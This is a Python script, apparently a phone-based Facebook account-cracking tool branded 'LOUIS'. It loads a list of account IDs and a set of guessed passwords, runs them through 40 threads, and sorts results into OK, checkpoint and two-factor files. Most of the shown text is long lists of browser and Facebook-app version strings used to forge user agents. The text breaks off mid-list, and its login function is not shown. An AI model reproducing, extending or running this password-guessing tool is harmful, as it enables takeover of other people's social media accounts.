import os,base64,zlib,pip,urllib,time,certifi,random,requests,datetime,re,subprocess,uuid,sys,json,string,shutil
from os import path
from string import *
from time import time as ogenwa
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from time import sleep
from rich.table import Table
from rich.console import Console
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.panel import Panel as panel
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
from random import randrange as rr
from random import choice as rc
from gtts import gTTS
from rich import print
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO
from datetime import datetime
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"~"+month.get(today_data[1])+"~"+str(thn)
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
twc = '2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#-----------------------[ INFO GATHERING ]--------------------#
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:MeledakXd = cek_data["isp"]
except:MeledakXd = {'-'}
try:MeledakSu = cek_data["city"]
except:MeledakSu = {'-'}
try:Country = cek_data["country"] 
except:Country = {'-'}
try:Reg = cek_data["regionName"] 
except:Reg = {'-'}
try:Timif = cek_data["timezone"] 
except:Timif = {'-'}
ip = requests.get("https://api.ipify.org").text
try:
    simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
    simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")

G = '\033[38;2;255;127;0;1m' #ORANGE
U = '\x1b[1;95m' #MAGENTA
M = '\x1b[1;91m' #RED
H = '\x1b[1;92m' #GREEN
K = '\x1b[1;93m' #YELLOW
B = '\x1b[1;94m' #BLUE
P = '\x1b[1;97m' #WHITE
Z = "\033[1;30m" #GRAY
b = '\33[1;96m' #CYAN
asux = ["[orange_red1]","[deep_pink1]","[purple]","[bold cyan]","[medium_violet_red]","[medium_spring_green]","[dark_olive_green1]"]
colour=random.choice([K,G,b])
logo=(f'''[bold cyan][bold cyan][bold cyan]     
888       e88 88e   8888 8888 888  dP"8   
888      d888 888b  8888 8888 888 C8b Y   
888     C8888 8888D 8888 8888 888  Y8b    
888  ,d  Y888 888P  8888 8888 888 b Y8D   
888,d88   "88 88"   'Y88 88P' 888 8edP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[magenta][[bold green]•[magenta]] Owner       :[bold green] LOUIS
[magenta][[bold green]•[magenta]] STATUS      :[bold green] Premium 
[magenta][[bold green]•[magenta]] VERSION     :[bold green] 1.1
[magenta][[bold green]•[magenta]] WHATSAPP    :[bold green] +2347082234924
[magenta][[bold green]•[magenta]] STATE       :[bold green] {Reg}
[magenta][[bold green]•[magenta]] COUNTRY     :[bold green] {Country}
[magenta][[bold green]•[magenta]] TIME ZONE   :[bold green] {Timif}
[magenta][[bold green]•[magenta]] NETWORK     :[bold green] {simcard}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

def clear():
    os.system(f'clear')
    print(logo)
       
        
class Demon:
    
    def clear(self):
        os.system("clear")
    



me=Demon()
oks,loop,ua,ussr,twf,cps=[],0,[],[],[],[]
ua = []
useragent=[]

def main():
    me.clear()
    ussr = open('/sdcard/username.txt','r').read()
    print(logo)
    ask = "1"
    
    if ask in ["01","1","A","a"]:
        filll()
    else:
        print(" [bold red] WRONG OPTION")
        time.sleep(3)
        main()

def coutpass(pwx):
    j=len(pwx)+1
    if j <9:
        return "0"+str(j)
    else:
        return str(j)


def filll():
    me.clear()
    pwx=[]
    crsk = []
    clear()
    #os.popen('play-audio jbf_3.mp3')
    #os.popen('play-audio jbf_4.mp3')
    flpa=input(f'{U}[{H}•{U}] ENTER FILE PATH :{H} ')
    try:
        fl=open(flpa,"r").read().splitlines()
        #os.popen('play-audio jbf_1.mp3')
    except:
        filll()
        #os.popen('play-audio jbf_2.mp3')
    limit=int(input(f'{U}[{H}•{U}] HOW MANY PASSWORDS DO YOU WANT TO ADD :{H} '))
    for i in range(limit):        
        flpa=str(input(f'{U}[{H}{coutpass(pwx)}{U}]{H} > '))
        
        if flpa not in pwx:
            pwx.append(flpa)
        #print("")
    with ThreadPool(max_workers=40) as sub:
        clear()
        tl = str(len(fl))
        #os.popen('play-audio jbf_5.mp3')
        print(f'[magenta][[bold green]•[magenta]] TOTAL IDS TO BE CRACKED ARE [bold green]{tl}[magenta]')
        print(f"[magenta][[bold green]•[magenta]] TODAY'S DATE [bold green]{today}[magenta]")
        print(f"[magenta][[bold green]•[magenta]] TOTAL PASSWORD [bold green]{str(len(pwx))}[magenta]")
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        #print(f"[magenta][[bold green]•[magenta]] [bold green]OK [magenta]RESULT STORED IN [bold green]{okc}\n[magenta][[bold green]•[magenta]] [bold purple]CP [magenta]RESULT STORED IN [bold purple]{cpc}\n[magenta][[bold green]•[magenta]] [bold yellow]2F [magenta]RESULT STORED IN [bold yellow]{twc}\n")
       # print("")
        try:
            for xd in fl:
                uid,name=xd.split("|")
                sub.submit(diablo,uid,pwx,name,fl)
                
                
        except:pass
    print("\n")
    print(f"[magenta][[bold green]•[magenta]] TOTAL [bold green]OK IDs {str(len(oks))}")
    print(f"[magenta][[bold green]•[magenta]] SAVED TO  [bold green]LOUIS-OK/{okc}")
    print("")
    print(f"[magenta][[bold green]•[magenta]] TOTAL [bold purple]CP IDs {str(len(cps))}")
    print(f"[magenta][[bold green]•[magenta]] SAVED TO  [bold red]LOUIS-CP/{cpc}")
    print("")
    print(f"[magenta][[bold green]•[magenta]] TOTAL [bold yellow]2F IDs {str(len(twf))}")
    print(f"[magenta][[bold green]•[magenta]] SAVED TO  [bold yellow]LOUIS-TWF/{twc}")
    print("")
    sys.exit()


color=["\033[1;36m","\033[1;35m","\033[1;34m","\033[1;33m","\033[1;32m","\033[1;31m"]

def night_ua():
    chrome = rc(["112.0.5615.48","112.0.5615.100","112.0.5615.136","111.0.5563.115","112.0.5615.101","114.0.5735.61","114.0.5735.53","113.0.5672.77","114.0.5735.58","113.0.5672.131","116.0.5845.92","115.0.5790.139","114.0.5735.131","115.0.5790.138","115.0.5790.136","117.0.5938.153","117.0.5938.140","116.0.5845.114","116.0.5845.173","116.0.5845.172","120.0.6099.43","119.0.6045.193","118.0.5993.81","118.0.5993.80","119.0.6045.163","126.0.6478.71","61.0.3163.98","74.0.3729.112","60.0.3112.107","126.0.6478.72","125.0.6422.112","125.0.6422.113","126.0.6478.50","125.0.6422.147","125.0.6422.164","121.0.6167.164","120.0.6099.194","121.0.6167.101","120.0.6099.211","120.0.6099.44","122.0.6261.119","122.0.6261.90","122.0.6261.105","122.0.6261.43","122.0.6261.106","124.0.6367.113","123.0.6312.99","124.0.6367.54","123.0.6312.100","123.0.6312.40","125.0.6422.53","124.0.6367.114","8262391243","124.0.6367.172","124.0.6367.161","94.0.4606.61","93.0.4577.82","93.0.4577.62","92.0.4515.166","92.0.4515.159","94.0.4606.80","95.0.4638.50","94.0.4606.85","96.0.4664.45","95.0.4638.74","98.0.4758.87","96.0.4664.104","96.0.4664.92","97.0.4692.70","97.0.4692.98","100.0.4896.58","99.0.4844.58","99.0.4844.73","98.0.4758.101","99.0.4844.88","101.0.4951.61","100.0.4896.88","100.0.4896.79","101.0.4951.41","100.0.4896.127","103.0.5060.70","102.0.5005.78","102.0.5005.59","102.0.5005.99","102.0.5005.125","109.0.5414.117","111.0.5563.48","111.0.5563.57","110.0.5481.154","110.0.5481.64","105.0.5195.79","103.0.5060.129","103.0.5060.71","104.0.5112.97","105.0.5195.68","106.0.5249.126","106.0.5249.118","105.0.5195.124","106.0.5249.79","106.0.5249.65","109.0.5414.86","107.0.5304.105","107.0.5304.91","107.0.5304.141","108.0.5359.128","81.0.4044.96","80.0.3987.132","80.0.3987.119","80.0.3987.162","80.0.3987.149","83.0.4103.101","81.0.4044.117","81.0.4044.111","81.0.4044.138","83.0.4103.96","84.0.4147.125","84.0.4147.89","83.0.4103.106","84.0.4147.111","84.0.4147.105","86.0.4240.75","85.0.4183.81","85.0.4183.101","85.0.4183.127","85.0.4183.120","86.0.4240.198","86.0.4240.110","86.0.4240.185","86.0.4240.114","86.0.4240.99","88.0.4324.141","87.0.4280.101","87.0.4280.66","87.0.4280.86","87.0.4280.141","89.0.4389.90","88.0.4324.181","88.0.4324.152","89.0.4389.86","89.0.4389.72","90.0.4430.91","90.0.4430.66","90.0.4430.82","89.0.4389.105","91.0.4472.114","91.0.4472.77","90.0.4430.210","91.0.4472.88","91.0.4472.101","92.0.4515.115","92.0.4515.105","91.0.4472.164","91.0.4472.134","91.0.4472.120","92.0.4515.131","65.0.3325.109","64.0.3282.137","64.0.3282.116","64.0.3282.123","63.0.3239.107","67.0.3396.81","66.0.3359.158","66.0.3359.106","66.0.3359.126","67.0.3396.68","69.0.3497.76","68.0.3440.70","68.0.3440.91","68.0.3440.85","67.0.3396.87","69.0.3497.86","69.0.3497.100","69.0.3497.91","70.0.3538.80","70.0.3538.64","71.0.3578.83","72.0.3626.76","71.0.3578.98","71.0.3578.99","70.0.3538.110","73.0.3683.90","72.0.3626.105","72.0.3626.96","73.0.3683.75","72.0.3626.121","75.0.3770.89","74.0.3729.136","74.0.3729.112","75.0.3770.101","75.0.3770.67","75.0.3770.143","76.0.3809.89","76.0.3809.111","77.0.3865.92","76.0.3809.132","79.0.3945.79","78.0.3904.62","78.0.3904.108","78.0.3904.96","77.0.3865.116","80.0.3987.99","79.0.3945.116","79.0.3945.93","80.0.3987.87","79.0.3945.136","61.0.3163.98","62.0.3202.84","63.0.3239.83","62.0.3202.66","62.0.3202.73","61.0.3163.81","60.0.3112.107","60.0.3112.116","60.0.3112.78","60.0.3112.97","57.0.2987.132","59.0.3071.117","59.0.3071.125","58.0.3029.83","59.0.3071.92","54.0.2840.85","55.0.2883.91","57.0.2987.108","55.0.2883.84","56.0.2924.87","50.0.2661.89","51.0.2704.81","52.0.2743.98","52.0.2743.91","51.0.2704.77","54.0.2840.85","53.0.2785.124","54.0.2840.68"])
    silk = str(rr(200,299))+"."+str(rr(0,99))+"."+str(rr(0,99))
    yandex = rc(["24.6.6.26","24.6.4.98","24.6.2.93","24.6.2.93","24.6.1.82","24.6.0.233","24.4.6.49","24.4.5.105","24.4.5.105","24.4.4.105","24.4.4.99","24.4.4.94","24.4.0.312","24.4.0.300","24.4.0.298","24.4.0.298","24.4.0.292","24.2.0.35","24.2.0.35","24.1.9.58","24.1.9.56","24.1.9.56","24.1.9.56","24.1.8.94","24.1.8.90","24.1.8.90","24.1.8.90","24.1.7.101","24.1.7.101","24.1.6.86","24.1.6.80","24.1.6.80","24.1.5.89","24.1.5.88","24.1.4.98","24.1.2.109","24.1.2.108","24.1.2.107","24.1.2.106","24.1.2.104","24.1.2.104","24.1.2.92","24.1.2.85","24.1.1.111","24.1.1.111","24.1.1.91","24.1.1.91","24.1.0.328","24.1.0.328","23.11.5.133","23.11.5.129","23.11.5.125","23.11.5.124","23.11.5.124","23.11.5.120","23.11.5.120","23.11.5.98","23.11.5.98","23.11.4.88","23.11.4.83","23.11.4.83","23.11.3.107","23.11.3.107","23.11.2.92","23.11.2.92","23.11.1.109","23.11.1.109","23.11.1.105","23.11.1.105","23.11.0.232","23.11.0.232","23.9.9.29","23.9.9.29","23.9.8.40","23.9.8.39","23.9.8.39","23.9.7.83","23.9.7.83","23.9.7.80","23.9.6.84","23.9.5.83","23.9.5.83","23.9.4.86","23.9.4.86","23.9.3.94","23.9.3.94","23.9.3.87","23.9.3.87","23.9.2.80","23.9.1.99","23.9.0.237","23.7.8.43","23.7.8.36","23.7.7.58","23.7.7.54","23.7.7.54","23.7.5.95","23.7.4.95","23.7.4.94","23.7.3.104","23.7.3.100","23.7.3.100","23.7.2.98","23.7.1.112","23.7.1.110","23.7.0.284","23.7.0.283","23.7.0.282","23.7.0.281","23.7.0.278","23.7.0.271","23.5.6.42","23.5.5.61","23.5.5.60","23.5.5.53","23.5.5.50","23.5.4.97","23.5.3.75","23.5.2.81","23.5.1.73","23.5.0.256","23.3.7.28","23.3.7.27","23.3.7.24","23.3.6.52","23.3.6.40","23.3.5.83","23.3.4.84","23.3.4.81","23.3.3.100","23.3.3.98","23.3.3.88","23.3.3.86","23.3.2.86","23.3.1.90","23.3.1.88","23.3.0.219","23.1.7.38","23.1.6.121","23.1.6.120","23.1.5.98","23.1.5.93","23.1.5.90","23.1.5.87","23.1.5.87","23.1.4.84","23.1.3.87","23.1.2.92","23.1.2.86","23.1.1.81","23.1.1.79","23.1.0.330","22.11.7.42","22.11.6.43","22.11.6.41","22.11.5.82","22.11.4.88","22.11.4.86","22.11.3.96","22.11.3.89","22.11.3.85","22.11.2.78","22.11.2.74","22.11.2.74","22.11.1.77","22.11.1.75","22.11.0.224","22.9.8.40","22.9.8.37","22.9.7.43","22.9.6.73","22.9.5.78","22.9.5.77","22.9.5.73","22.9.4.79","22.9.3.82","22.9.2.91","22.9.2.90","22.9.1.98","22.9.0.225","22.9.0.225","22.9.0.222","22.7.9.36","22.7.8.39","22.7.7.86","22.7.6.96","22.7.5.92","22.7.5.90","22.7.4.88","22.7.3.82","22.7.2.91","22.7.2.89","22.7.1.95","22.7.1.94","22.7.0.144","22.5.6.49","22.5.5.93","22.5.4.84","22.5.3.85","22.5.2.68","22.5.1.156","22.5.1.153","22.5.1.152","22.5.0.168","22.5.0.163","22.3.6.66","22.3.6.61","22.3.5.89","22.3.5.86","22.3.4.86","22.3.3.91","22.3.3.89","22.3.3.89","22.3.2.95","22.3.1.87","22.3.1.86","22.3.0.303","22.1.7.82","22.1.7.81","22.1.6.114","22.1.5.99","22.1.4.115","22.1.4.110","22.1.3.105","22.1.2.126","22.1.2.119","22.1.1.215","22.1.0.365","21.11.7.74","21.11.7.71","21.11.7.71","21.11.6.69","21.11.5.121","21.11.4.115","21.11.3.107","21.11.2.101","21.11.1.122","21.11.1.114","21.11.0.251","21.9.0.370","21.9.0.359","21.8.5.54","21.8.4.121","21.8.4.112","21.8.3.112","21.8.2.129","21.8.1.138","21.8.1.127","21.6.6.55","21.6.5.122","21.6.4.119","21.6.3.113","21.6.3.110","21.6.2.119","21.6.1.137","","21.6.1.128","21.6.0.313","21.5.6.61","21.5.6.56","21.5.5.110","21.5.4.119","21.5.3.120","21.5.2.110","21.5.1.120","21.5.1.107","21.5.0.350","21.3.4.59","21.3.3.160","21.3.3.153","21.3.2.152","21.3.2.144","21.3.1.138","21.3.1.128","21.3.0.269","21.3.0.265","21.3.0.258","21.2.6.77","21.2.6.68","21.2.5.163","21.2.5.132","21.2.4.139","21.2.3.335","21.2.3.328","21.2.3.321","21.2.2.99","21.2.2.91","21.2.1.118","21.2.1.117","21.2.1.108","21.2.0.223","20.12.5.127","20.12.5.126","20.12.5.121","20.12.4.100","20.12.3.116","20.12.2.68","20.12.1.104","20.12.1.98","20.12.1.91","20.12.0.141","20.11.5.126","20.11.5.124","20.11.5.113","20.11.4.121","20.11.3.88","20.11.2.69","20.11.2.69","20.11.1.105","20.11.1.103","20.11.1.99","20.11.1.88","20.11.0.180","20.11.0.164","20.9.5.72","20.9.4.118","20.9.4.99","20.9.3.97","20.9.3.96","20.9.3.85","20.9.2.95","20.9.1.66","20.9.0.203","20.9.0.159","20.8.5.97","20.8.4.75","20.8.3.71","20.8.2.90","20.8.1.71","20.8.1.71","20.8.0.186","20.8.0.183","20.8.0.174","20.8.0.174","20.8.0.161","20.7.5.104","20.7.5.84","20.7.4.108","20.7.3.99","20.7.3.99","20.7.3.95","20.7.2.70","20.7.1.60","20.7.0.101","20.6.3.54","20.6.2.104","20.6.1.73","20.6.0.211","20.6.0.182","20.4.5.67","20.4.5.63","20.4.4.76","20.4.3.90","20.4.2.101","20.4.1.146","20.4.1.144","20.4.0.237","20.3.5.90","20.3.4.98","20.3.3.95","20.3.3.92","20.3.2.107","20.3.0.276","20.3.0.276","20.2.6.114","20.2.5.140","20.2.5.131","20.2.5.120","20.2.4.157","20.2.4.153","20.2.4.139","20.2.4.136","20.2.2.128","20.2.2.127","20.2.1.120","20.2.0.215","19.12.4.87","19.12.3.107","19.12.3.101","19.12.2.152","19.12.1.121","19.12.0.250","19.10.4.187","19.10.3.139","19.10.3.139","19.10.2.116","19.10.1.100","19.9.6.102","19.9.6.94","19.9.6.88","19.9.5.101","19.9.4.119","19.9.4.118","19.9.4.104","19.9.3.116","19.9.2.117","19.9.2.117","19.9.1.126","19.7.7.115","19.7.7.111","19.7.5.90","19.7.4.97","19.7.3.91","19.7.2.90","19.7.2.90","19.7.1.93","19.7.0.117","19.6.4.366","19.6.4.349","19.6.4.349","19.6.3.318","19.6.2.338","19.6.1.396","19.6.0.612","19.4.5.141","19.4.4.317","19.4.3.352","19.4.2.454","19.4.2.449","19.4.1.454","19.4.1.435","19.4.0.535","19.3.7.195","19.3.6.275","19.3.5.299","19.3.5.294","19.3.4.339","19.3.3.288","19.3.3.285","19.3.2.347","19.3.1.333","19.3.1.327","19.3.0.597","19.3.0.583","19.1.3.202","19.1.3.198","19.1.2.337","19.1.1.692","19.1.0.1114","18.11.2.730","18.11.1.1011","18.11.1.1008","18.11.1.979","18.11.1.963","18.11.0.1462","18.11.0.1462","18.11.0.1411","18.11.0.1411","18.10.2.188","18.10.2.119","18.10.2.119","18.10.2.113","18.10.2.113","18.10.1.902","18.10.1.901","18.10.1.887","18.10.1.887","18.10.0.1012","18.9.2.131","18.9.2.31","18.9.2.31","18.9.1.2199","18.9.1.2199","18.9.0.490","18.9.0.489","18.9.0.486","18.9.0.486","18.9.0.466","18.9.0.466","18.7.1.595","18.7.1.595","18.7.1.575","18.7.1.575","18.7.0.833","18.7.0.823","18.7.0.823","18.7.0.817","18.6.0.716","18.6.0.683","18.6.0.683","18.6.0.683","18.4.1.535","18.4.1.534","18.4.1.529","18.4.1.529","18.4.1.513","18.4.1.498","18.4.1.498","18.4.1.488","18.4.0.659","18.4.0.649","18.3.1.667","18.3.1.663","18.3.1.651","18.3.1.651","18.1.2.70","18.1.2.70","18.1.1.645","18.1.1.645","18.1.1.642","18.1.0.527","18.1.0.527","18.1.0.507","17.11.1.657","17.11.1.632","17.11.1.628","17.11.1.628","17.11.0.542","17.11.0.531","17.11.0.530","17.11.0.526","17.11.0.519","17.11.0.465","17.10.2.145","17.10.2.145","17.10.2.135","17.10.1.370","17.9.0.533","17.9.0.524","17.9.0.523","17.7.0.1180","17.7.0.1178","17.7.0.1178","17.6.1.352","17.6.1.350","17.6.1.345","17.6.1.340","17.6.0.312","17.6.0.312","17.4.1.371","17.4.1.352","17.4.0.544","17.3.2.414","17.3.2.414","17.3.2.403","17.3.1.383","17.3.1.369","17.3.0.379","17.3.0.378","17.3.0.373","17.3.0.373","17.3.0.373","17.1.2.339","17.1.1.359","17.1.0.431","17.1.0.431","17.1.0.412","17.1.0.412","16.11.0.659","16.11.0.653","16.11.0.649","16.11.0.649","16.10.2.1487","16.10.1.1443","16.9.1.1633","16.9.1.1616","16.9.0.1579","16.9.0.1424","16.9.0.1424","16.7.1.2925","16.7.0.2917","16.7.0.2916","16.7.0.2777","16.6.0.9704","16.6.1.9652","16.6.0.8810","16.4.0.9472","16.4.0.9404","16.4.0.9335","16.4.0.9261","16.2.2.7988","16.2.1.7529","16.2.0.5397","15.12.2.6773","15.12.0.6164","15.10.2454.3908","15.10.2454.3845","15.6.2311.6092","15.6.2311.6088","15.6.2311.5738","15.6.2311.5718","15.4.2272.3842","15.4.2272.3608","15.2.2214.3729","15.2.2214.3581","14.12.2125.9740","14.10.2062.12160","14.5.1847.18432","14.4.1750.13427","23.9.0.98","22.8.1.92","22.8.0.90","22.8.0.86","22.8.0.84","22.8.0.77","22.4.0.71","22.4.0.70","22.4.0.69","22.1.0.68","21.1.0.67","21.1.0.51","21.1.0.48","21.1.0.47","19.6.0.45","19.6.0.44","19.6.0.39","19.6.0.38","18.4.1.20","18.4.0.18","18.4.0.12","18.4.0.11","18.4.0.2","20.12.0","13.12.1599.12218","13.9.1500.3524","1.0.1364.172"])    
    facebook = rc(["396.1.0.28.104","398.0.0.21.105","400.0.0.37.76","397.0.0.23.404","399.0.0.24.93","392.2.0.33.108","394.1.0.51.107","394.0.0.50.107","395.0.0.27.214","396.0.0.21.104","402.0.0.21.84","404.0.0.35.70","403.0.0.27.81","401.0.0.24.77","405.0.0.23.72","409.0.0.27.106","407.0.0.30.97","405.1.0.28.72","406.0.0.26.90","408.1.0.36.103","411.1.0.29.112","410.0.0.26.115","413.0.0.30.104","412.0.0.22.115","414.0.0.30.113","419.0.0.29.71","415.0.0.34.107","417.0.0.33.65","416.0.0.35.85","418.0.0.33.69","443.0.0.23.229","420.0.0.32.61","419.0.0.37.71","426.0.0.26.50","427.0.0.31.63","458.0.0.38.86","450.0.0.42.110","455.0.0.0.35","445.0.0.34.118","454.0.0.0.77","465.0.0.0.6","460.0.0.0.52","463.0.0.0.50","461.0.0.0.73","464.0.0.0.55","471.0.0.0.2","467.0.0.46.83","465.0.0.60.83","466.0.0.55.85","467.1.0.52.83","350.1.0.29.106","349.0.0.39.470","345.0.0.34.118","","346.0.0.29.119","357.0.0.23.115","353.0.0.34.116","356.0.0.28.112","352.0.0.20.117","354.0.0.22.110","362.0.0.27.109","358.0.0.34.117","360.0.0.30.113","359.0.0.30.118","361.0.0.39.115","366.1.0.20.113","363.0.0.30.112","364.1.0.25.132","364.0.0.24.132","365.0.0.30.112","370.0.0.23.112","367.0.0.24.107","368.0.0.24.108","369.0.0.18.103","367.2.0.26.107","375.0.0.26.111","371.0.0.24.109","373.0.0.31.112","372.1.0.23.107","374.0.0.20.109","379.0.0.24.109","375.1.0.28.111","377.0.0.22.107","376.0.0.12.108","378.0.0.18.112","384.1.0.29.111","380.0.0.29.109","382.0.0.33.111","381.0.0.29.105","383.0.0.23.106","389.0.0.42.111","385.0.0.32.114","387.0.0.24.102","386.0.0.35.108","388.0.0.32.105","392.0.0.32.108","391.0.0.33.104","390.0.0.27.105","391.1.0.37.104","297.0.0.36.116","222.0.0.10.118","295.0.0.34.119","294.0.0.39.118","296.0.0.44.119","300.2.0.58.129","298.0.0.46.116","299.0.0.51.236","300.0.0.51.129","300.1.0.57.129","305.1.0.40.120","302.0.0.45.119","304.0.0.39.118","303.0.0.30.122","305.0.0.40.120","309.0.0.47.119","306.1.0.40.119","308.0.0.42.118","307.0.0.40.111","309.0.0.45.119","314.1.0.45.119","310.0.0.50.118","313.0.0.35.119","312.0.0.45.117","314.0.0.43.119","319.0.0.39.120","315.0.0.47.113","316.0.0.54.116","318.0.0.39.154","317.0.0.51.119","326.0.0.34.120","320.0.0.34.118","324.0.0.48.120","322.0.0.35.121","325.0.0.36.170","331.1.0.29.117","328.0.0.22.119","329.0.0.29.120","328.1.0.28.119","330.0.0.31.120","339.0.0.32.118","332.0.0.23.111","337.0.0.32.118","336.0.0.20.117","338.1.0.36.118","344.0.0.34.116","340.0.0.27.113","342.0.0.37.119","341.0.0.30.73","343.0.0.37.117","250.0.0.26.241","246.0.0.49.121","248.1.0.44.116","249.0.0.47.118","247.0.0.42.116","255.0.0.33.121","254.0.0.37.125","251.0.0.31.111","253.0.0.28.116","252.0.0.22.355","260.0.0.42.118","258.0.0.34.119","257.0.0.44.118","256.0.0.39.117","259.0.0.36.115","261.0.0.52.126","263.0.0.46.121","262.0.0.34.117","264.0.0.44.111","268.1.0.54.121","265.0.0.61.103","266.0.0.64.124","266.0.0.56.124","267.1.0.46.120","271.0.0.55.109","270.1.0.66.127","270.0.0.57.127","269.0.0.50.127","272.0.0.50.125","277.0.0.41.126","273.0.0.39.123","275.0.0.49.127","274.0.0.46.119","276.0.0.44.127","282.0.0.40.117","278.0.0.51.119","280.0.0.44.122","279.0.0.43.120","281.0.0.36.124","288.0.0.46.123","283.0.0.31.121","285.0.0.43.120","284.0.0.50.107","286.0.0.48.112","292.0.0.61.123","291.0.0.44.120","290.0.0.44.121","289.0.0.40.121","292.0.0.60.123","293.0.0.43.120","201.0.0.58.99","199.0.0.56.98","198.0.0.48.101","198.0.0.53.101","200.0.0.50.194","206.0.0.36.105","202.0.0.40.99","204.0.0.24.101","203.0.0.16.293","205.0.0.27.113","211.0.0.43.112","208.0.0.38.104","207.0.0.33.100","209.0.0.39.91","210.0.0.43.119","217.0.0.45.98","214.0.0.43.83","212.0.0.28.110","215.0.0.45.98","216.0.0.38.104","221.0.0.48.102","218.0.0.46.109","219.0.0.46.114","219.0.0.42.114","220.0.0.46.112","226.0.0.49.120","222.0.0.48.113","224.0.0.33.114","223.0.0.47.120","225.0.0.47.118","231.0.0.39.113","227.0.0.43.158","229.0.0.35.117","228.0.0.41.124","230.0.0.36.117","235.0.0.38.118","232.0.0.35.115","234.0.0.30.115","233.0.0.36.117","236.0.0.40.117","241.0.0.39.120","237.0.0.44.120","239.0.0.41.152","238.0.0.41.116","240.0.0.38.121","245.0.0.39.118","242.0.0.43.119","243.0.0.49.108","243.0.0.47.108","244.0.0.43.118","157.0.0.38.97","154.0.0.33.385","155.0.0.33.96","154.0.0.29.385","156.0.0.36.100","162.0.0.45.94","161.0.0.35.93","160.0.0.30.94","158.0.0.38.95","159.0.0.38.95","166.0.0.63.95","164.0.0.44.95","163.0.0.36.91","163.0.0.43.91","165.0.0.53.93","169.0.0.46.94","168.0.0.35.90","166.0.0.66.95","167.0.0.42.94","168.0.0.40.90","174.0.0.54.96","172.0.0.66.93","170.0.0.52.95","171.0.0.49.92","173.0.0.62.99","178.0.0.57.86","175.0.0.40.97","177.0.0.57.105","176.0.0.42.87","178.0.0.48.86","183.0.0.39.75","182.0.0.44.77","180.0.0.35.82","181.0.0.36.82","179.0.0.44.83","186.0.0.48.81","184.0.0.41.79","183.0.0.39.75","183.0.0.57.75","185.0.0.39.72","191.0.0.35.96","189.0.0.35.91","187.0.0.43.81","188.0.0.44.81","190.0.0.34.94","196.0.0.41.95","194.0.0.42.99","192.0.0.34.85","193.0.0.45.101","195.0.0.35.99","197.0.0.46.98","472.0.0.0.49","120.0.0.18.72","118.0.0.22.79","115.0.0.20.72","117.0.0.18.47","119.0.0.23.70","126.0.0.21.77","124.0.0.22.66","121.0.0.20.69","122.0.0.17.71","125.0.0.23.80","129.0.0.29.67","128.0.0.26.68","128.0.0.25.68","126.0.0.23.77","127.0.0.22.69","134.0.0.25.91","132.0.0.20.85","130.0.0.45.70","131.0.0.32.69","133.0.0.19.83","138.0.0.19.93","137.0.0.24.91","135.0.0.22.90","136.0.0.22.91","138.0.0.16.93","141.0.0.30.91","140.0.0.21.91","139.0.0.22.93","139.0.0.26.93","141.0.0.20.91","143.0.0.32.90","142.0.0.27.92","142.0.0.29.92","141.0.0.31.91","142.0.0.28.92","148.0.0.45.62","146.0.0.53.92","144.0.0.27.91","145.0.0.37.86","147.0.0.44.75","152.0.0.34.136","150.0.0.38.138","148.0.0.51.62","149.0.0.40.71","151.0.0.44.205","153.0.0.54.88","152.0.0.42.136","153.0.0.53.88","55.0.0.18.66","53.0.0.5.18","51.0.0.14.10","53.0.0.29.18","60.0.0.16.76","57.0.0.18.136","59.0.0.15.313","58.0.0.28.70","60.0.0.13.76","66.0.0.33.73","64.0.0.52.76","62.0.0.42.77","63.0.0.37.81","65.0.0.42.81","78.0.0.16.67","72.0.0.22.69","68.0.0.37.59","70.0.0.22.83","73.0.0.18.66","88.0.0.22.76","82.0.0.23.70","78.0.0.16.67","82.0.0.20.70","86.0.0.13.69","92.0.0.16.72","90.0.0.20.70","89.0.0.17.70","89.0.0.18.70","91.0.0.17.68","97.0.0.18.69","93.0.0.13.69","96.0.0.17.70","95.0.0.13.69","98.0.0.18.70","103.0.0.20.72","99.0.0.26.69","101.0.0.18.70","100.0.0.20.70","102.0.0.28.70","108.0.0.17.68","104.0.0.17.71","107.0.0.19.337","106.0.0.26.68","109.0.0.15.71","114.0.0.20.70","110.0.0.15.69","113.0.0.16.70","26.0.0.0.1","24.0.0.0.1","23.0.0.0.8","24.0.0.30.15","27.0.0.0.14","27.0.0.0.9","26.0.0.0.6","27.0.0.0.7","27.0.0.0.11","28.0.0.1.16","27.0.0.0.15","28.0.0.0.8","28.0.0.0.0","28.0.0.0.16","29.0.0.0.11","29.0.0.0.5","29.0.0.0.0","29.0.0.0.4","29.0.0.0.7","30.0.0.19.17","30.0.0.0.13","30.0.0.0.0","30.0.0.0.7","31.0.0.0.0","35.0.0.0.337","32.0.0.0.8","34.0.0.0.242","33.0.0.0.1","35.0.0.0.250","39.0.0.0.73","38.0.0.0.64","37.0.0.0.132","37.0.0.0.250","38.0.0.0.81","42.0.0.27.114","42.0.